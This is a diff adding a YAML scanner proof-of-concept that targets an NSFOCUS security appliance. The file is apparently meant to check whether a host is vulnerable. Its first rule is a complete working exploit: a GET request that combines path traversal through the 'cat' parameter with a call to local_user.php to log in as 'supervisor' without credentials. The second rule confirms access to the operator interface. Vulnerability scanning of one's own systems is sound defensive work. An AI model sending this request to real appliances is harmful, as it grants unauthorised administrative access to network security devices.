@@ -1,0 +1,20 @@
+name: poc-yaml-nsfsas-userlogin
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /api/virtual/home/status?cat=..//..//..//..//..//..//..//..//..//..//..//..//..//..//usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=supervisor
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("{\"status\":200}")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /operate/index
+            follow_redirects: true
+        expression: response.status == 200 && response.body_string.contains("/js/jquery/nsfocus.jqueryui.js") && response.body_string.contains("getReportTitle")
+expression: r0() && r1()
+detail: {}
